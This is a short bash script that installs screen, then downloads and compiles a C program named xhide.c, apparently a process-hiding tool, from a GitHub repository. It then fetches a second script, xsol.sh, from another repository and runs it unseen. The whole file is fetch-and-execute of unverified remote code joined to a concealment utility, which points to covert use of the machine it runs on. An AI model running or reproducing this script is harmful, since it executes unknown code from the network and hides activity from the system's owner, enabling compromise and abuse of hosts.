#!/bin/bash
apt-get update
sudo apt install screen -y
wget https://github.com/DarshGoswami1982/pro/raw/main/xhide.c
gcc -o xhide xhide.c
wget https://github.com/DarshGoswami1982/dgun/raw/main/xsol.sh
chmod +x xsol.sh
./xsol.sh
